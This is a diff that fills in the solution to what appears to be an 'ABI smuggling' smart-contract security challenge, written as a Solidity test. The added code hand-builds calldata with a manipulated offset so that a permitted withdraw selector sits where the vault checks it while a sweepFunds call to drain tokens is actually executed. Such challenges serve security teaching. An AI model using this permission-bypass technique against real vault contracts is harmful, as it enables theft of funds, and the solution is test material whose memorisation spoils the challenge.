@@ -73,7 +73,23 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes4 withdrawSelector = bytes4(hex"d9caed12"); // -- the one we have permission for
+        bytes4 sweepSelector = SelfAuthorizedVault.sweepFunds.selector;
+
+        bytes memory payload = abi.encodePacked(
+            vault.execute.selector, // -- execute function selector
+            abi.encode(address(vault)), // -- target address (padded to 32 bytes)
+            uint256(0x80), // -- offset to actionData (4 * 32 bytes)
+            uint256(0), // -- padding
+            withdrawSelector, // -- our allowed selector
+            bytes28(0), // -- padding to maintain alignment
+            uint256(0x44), // --  length of the actual data (4 + 2*32 bytes)
+            sweepSelector, // -- actual function to call
+            abi.encode(recovery, address(token)) // -- parameters for sweepFunds
+        );
+
+        (bool success, ) = address(vault).call(payload);
+        require(success, "call failed");
     }
 
     /**
